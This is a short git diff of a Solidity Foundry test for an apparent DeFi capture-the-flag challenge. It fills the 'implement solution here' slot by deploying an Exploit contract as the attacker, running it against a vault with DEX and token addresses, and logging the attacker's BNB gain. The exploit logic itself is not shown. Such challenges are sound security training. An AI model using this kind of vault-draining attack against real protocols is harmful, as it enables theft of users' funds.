@@ -13,6 +13,7 @@ import {Token} from "src/other/Token.sol";
 import {AutoCompoundVault} from "src/fatality/AutoCompoundVault.sol";
 import {BunnyMinter} from "src/fatality/BunnyMinter.sol";
 import {ZapBSC} from "src/fatality/ZapBSC.sol";
+import {Exploit} from "src/fatality/Exploit.sol";
 
 
 contract Testing is Test {
@@ -154,6 +155,16 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        Exploit exp = new Exploit(
+            address(uniFactory),
+            address(uniRouter),
+            address(bnb),
+            address(dai),
+            address(usdc), 
+            address(bunny)
+        );
+        exp.start(address(vault));
+        emit log_named_decimal_uint("bnb=", bnb.balanceOf(attacker), 18);
 
         vm.stopPrank();
         validation();
